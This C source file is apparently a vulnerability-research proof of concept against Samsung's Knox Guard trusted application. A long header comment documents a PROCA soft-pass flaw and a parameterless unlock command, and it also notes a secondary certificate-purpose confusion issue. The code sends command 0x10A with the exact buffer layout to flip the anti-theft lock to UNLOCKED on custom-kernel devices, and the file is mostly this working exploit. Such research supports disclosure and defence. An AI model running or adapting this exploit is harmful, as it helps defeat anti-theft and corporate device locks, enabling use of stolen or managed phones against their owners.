/*
 * knxgud (Samsung Knox Guard) cmd 0x10A KG_UNLOCK — PROCA-soft-pass unlock bypass.
 *
 * FINDING / SEVERITY: HIGH/CRITICAL — Knox Guard anti-theft / corporate-lock
 *   bypass. (RE/samsung_teegris/knxgud.md §"FINDING — HIGH/CRITICAL", lines
 *   245-309; emulation/knxgud.md §finding #1, lines 9-16.)
 *
 * CITATION (RE/samsung_teegris/knxgud.md):
 *   - dispatcher TA_InvokeCommandEntryPoint @0x1FE7C validates param_types and
 *     both sizes, then runs a PROCA prelude before process_cmd (lines 75-92).
 *   - PROCA soft-pass: kg_proca_authenticate returning 1179648 ("PROCA not
 *     supported") or 1114137 ("custom kernel") makes the gate LOG-AND-CONTINUE
 *     instead of bailing → process_cmd runs with NO caller binding
 *     (lines 90-92, 251-259, 644-660).
 *   - kg_unlock is cmd 0x10A / 266 (command table line 111).
 *   - kg_unlock @0x205B4 is PARAMETERLESS and is a one-call unlock primitive —
 *     no token, no HOTP, no signature, no nonce: it reads kg_secure_data,
 *     unwraps it, bumps the unlock counter, sets state→2 (UNLOCKED), repacks
 *     (lines 261-285, 461-491). kg_verify_complete_token (cmd 0x10B) is what
 *     unlock is SUPPOSED to follow, but 0x10A never checks that 0x10B ran
 *     (lines 483-491).
 *
 * WIRE (RE/samsung_teegris/knxgud.md §"IPC surface" + §"Param schema", lines
 *   59-143). The ONLY accepted shape:
 *     param_types == 0x67 == TEE_PARAM_TYPES(MEMREF_INOUT, MEMREF_OUTPUT, NONE, NONE)
 *     params[0] = 17472-B request:  [cmd_id:4][per-cmd payload...]
 *     params[1] = 17472-B response: [cmd_id|0x80000000:4][result:4][payload...]
 *   BOTH memref sizes MUST be exactly 17472 — anything else returns -65530 /
 *   -65535 immediately (lines 61-66, 78). kg_unlock has no per-cmd payload, so
 *   only the cmd_id at params[0]+0 matters; the rest of the request is zeros.
 *
 * TRIGGER: open a PUBLIC-login session and invoke cmd 0x10A with a 17472-B
 *   zero-filled request and a 17472-B response buffer. On a custom-kernel /
 *   PROCA-stripped device the gate soft-passes and kg_unlock flips state→2.
 *   One call, one state transition, no recovery from the device side
 *   (knxgud.md lines 288-309 "Exploit chain" / "Why worse than VLTKPR").
 *
 * GATE / REPRO-STATUS: DEVICE-ONLY (PROCA). Per emulation/knxgud.md lines
 *   83-137, TA_InvokeCommandEntryPoint halts in its PROCA prelude at the
 *   un-modeled TEE_OpenTASession (TA→PROCA, UUID …0050524f4341) BEFORE
 *   process_cmd. The emulator's default_func HALTS rather than *returning* the
 *   1179648/1114137 soft-code the dispatcher's fall-through keys on, so the bug
 *   cannot be driven in-emulator as-is. The established in-emulator soft-pass is
 *   the `vltkpr_authenticate_ca_softpass` pattern: a .json inline hook that
 *   stubs the TA's authenticate routine to return the pass value so the
 *   dispatch is reached (vltkpr_verifycert/jni/poc.c lines 19-26; hook lives in
 *   tas/00000000-0000-0000-0000-564c544b5052.json). For knxgud the analogue is
 *   an inline hook on kg_proca_authenticate (@0x23B54) returning a soft-code
 *   (1179648 or 1114137) so the dispatcher falls through to process_cmd.
 *   Even past that, the handler path further needs an un-modeled GCM unwrap
 *   (EVP_aes_256_gcm / EVP_DecryptUpdate for tz_unwrap_data_with_derived_key)
 *   and a provisioned RPMB info-object (rot_check magic 0xEA030000) +
 *   TEES_RPMBWrite — same triple-prerequisite block class as engmod #2 /
 *   FbCkmR / duldar (emulation/knxgud.md lines 117-137). Hence: CONFIRMED-IN-
 *   BINARY + dynamic BLOCKED — this PoC documents the exact wire that fires the
 *   bypass on a real custom-kernel device; the emulator hosts the
 *   soft-pass condition but cannot return the soft-code.
 *
 * SECONDARY (MED): cert-purpose confusion in kg_provision_cert (cmd 0x117) —
 *   all four cert slots (enroll/bl/hotp/policy) chain-verify against the SAME
 *   hardcoded Samsung CA with no EKU/purpose-OID check, so a cert valid for one
 *   role is accepted in any slot (knxgud.md §"NEW FINDING — MED", lines
 *   435-456). Same dispatcher front-door (param_types 0x67, both sizes 17472);
 *   not driven here — see README.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include "tee_client_api.h"
#include "repro.h"

/* function-pointer block — copied from teessu_cleardata/jni/poc.c. load_functions()
 * in repro.h binds these to the *_emulate (EMULATE) or dlsym'd (device) impls. */
TEEC_Result (*TEEC_OpenSession_impl)(TEEC_Context*, TEEC_Session*, const TEEC_UUID*,
                                     uint32_t, const void*, TEEC_Operation*, uint32_t*);
TEEC_Result (*TEEC_InitializeContext_impl)(const char*, TEEC_Context*);
void (*TEEC_FinalizeContext_impl)(TEEC_Context*);
void (*TEEC_CloseSession_impl)(TEEC_Session*);
TEEC_Result (*TEEC_InvokeCommand_impl)(TEEC_Session*, uint32_t, TEEC_Operation*, uint32_t*);
TEEC_Result (*TEEC_RegisterSharedMemory_impl)(TEEC_Context*, TEEC_SharedMemory*);

/* knxgud dispatcher constants — every value cited from RE/samsung_teegris/knxgud.md. */
#define KG_CMD_UNLOCK   0x10Au   /* kg_unlock, command table line 111 / 265-266 */
#define KG_MEMREF_SIZE  17472u   /* mandatory size of BOTH memrefs, lines 64-66 / 78 */
#define OFF_CMD_ID      0x00     /* params[0]: [cmd_id:4][payload...], lines 139-142 */

void cleanup_shm(){
#if EMULATE
    system("ipcrm -M 0x13337"); system("ipcrm -M 0x13338");
    system("ipcrm -M 0x13339"); system("ipcrm -M 0x1333a");
#endif
}

int main(void)
{
    char* ta = "00000000-0000-0000-0000-6b6e78677564";   /* knxgud (ASCII tail = "knxgud") */
    TEEC_UUID *uuid = teegris_uuid(ta);
    uint32_t err_origin;
    TEEC_Result res;
    TEEC_Context context;
    TEEC_Session session;
    TEEC_Operation op;

    cleanup_shm();
    load_functions();

    res = TEEC_InitializeContext_impl(NULL, &context);
    if (res != TEEC_SUCCESS) { printf("InitializeContext failed 0x%x\n", res); exit(-1); }

    /* PUBLIC login — no credentials. TA_OpenSessionEntryPoint logs
     * "Open session for KG is success" with no caller checks (knxgud.md line 71). */
    res = TEEC_OpenSession_impl(&context, &session, uuid, TEEC_LOGIN_PUBLIC,
                                NULL, NULL, &err_origin);
    if (res != TEEC_SUCCESS) {
        printf("OpenSession failed 0x%x origin 0x%x\n", res, err_origin);
        TEEC_FinalizeContext_impl(&context); exit(-1);
    }
    printf("[*] session opened to knxgud with TEEC_LOGIN_PUBLIC (no creds)\n");

    /* Allocate BOTH memref buffers at the mandatory 17472 B (knxgud.md 64-66/78).
     * Anything else short-circuits with -65530/-65535 before the PROCA prelude. */
    uint8_t* in  = (uint8_t*)allocate_param_mem(&context, KG_MEMREF_SIZE);
    uint8_t* out = (uint8_t*)allocate_param_mem(&context, KG_MEMREF_SIZE);
    if (!in || !out) { printf("[poc] alloc failed\n"); exit(-1); }

    /* Build the request. kg_unlock (cmd 0x10A) is parameterless (knxgud.md line
     * 269), so the only meaningful field is the cmd_id at params[0]+0; the rest
     * of the 17472-B request stays zero. The response buffer is zeroed; the TA
     * writes [cmd_id|0x80000000][result][...] back into it on success. */
    memset(in, 0, KG_MEMREF_SIZE);
    memset(out, 0, KG_MEMREF_SIZE);
    *(uint32_t*)(in + OFF_CMD_ID) = KG_CMD_UNLOCK;

    /* op shape == 0x67 = [MEMREF_INOUT, MEMREF_OUTPUT, NONE, NONE]
     * (knxgud.md lines 61-65 / 138). The emulator forwards the TEEC wire
     * paramTypes to the TA with no TEEC->TEE translation, so 0x67 on the wire
     * is exactly what the dispatcher validates. */
    memset(&op, 0, sizeof(op));
    op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INOUT, TEEC_MEMREF_TEMP_OUTPUT,
                                     TEEC_NONE, TEEC_NONE);
    op.params[0].tmpref.buffer = in;  op.params[0].tmpref.size = KG_MEMREF_SIZE;
    op.params[1].tmpref.buffer = out; op.params[1].tmpref.size = KG_MEMREF_SIZE;

    printf("[*] invoking cmd 0x%x (KG_UNLOCK), both memrefs = %u B, ptypes = 0x67 ...\n",
           KG_CMD_UNLOCK, KG_MEMREF_SIZE);
    res = TEEC_InvokeCommand_impl(&session, KG_CMD_UNLOCK, &op, &err_origin);
    printf("[*] KG_UNLOCK returned 0x%x (%d) origin 0x%x\n", res, (int)res, err_origin);

    /* On a real custom-kernel device that fires the PROCA soft-pass, success
     * means state has transitioned to 2 (UNLOCKED). The response header carries
     * cmd_id|0x80000000 = 0x8000010A. In-emulator the call HALTS in the PROCA
     * prelude (see top comment, GATE) so we don't reach this state. */
    if (res == TEEC_SUCCESS) {
        uint32_t rsp_hdr = *(uint32_t*)(out + 0);
        printf("[*] response header = 0x%08x (expect 0x8000010A = cmd|response-bit)\n", rsp_hdr);
        printf("[*] >>> Knox Guard state -> 2 (UNLOCKED). Anti-theft lock defeated.\n");
    }

    TEEC_CloseSession_impl(&session);
    TEEC_FinalizeContext_impl(&context);
    return 0;
}
